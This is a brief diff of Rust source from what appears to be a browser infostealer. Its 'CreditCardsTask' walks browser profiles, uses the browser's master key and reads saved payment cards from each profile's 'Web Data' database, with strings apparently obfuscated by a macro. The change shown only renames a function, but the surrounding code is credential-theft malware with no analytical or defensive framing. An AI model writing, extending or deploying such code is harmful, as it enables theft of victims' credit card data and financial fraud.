@@ -34,7 +34,7 @@ impl Task for CreditCardsTask {
     unsafe fn run(&self, parent: &Path) {
         let Some(mut credit_cards) = collect_from_all_profiles(
             &self.browser.profiles,
-            |profile| get_credit_cards(profile, &self.browser.master_key)
+            |profile| read_credit_cards(profile, &self.browser.master_key)
         ) else {
             return
         };
@@ -45,7 +45,7 @@ impl Task for CreditCardsTask {
     }
 }
 
-fn get_credit_cards(profile: &Path, master_key: &[u8]) -> Option<Vec<CreditCard>> {
+fn read_credit_cards(profile: &Path, master_key: &[u8]) -> Option<Vec<CreditCard>> {
     let web_data_path = profile / s!("Web Data");
     
     read_sqlite3_and_map_records(
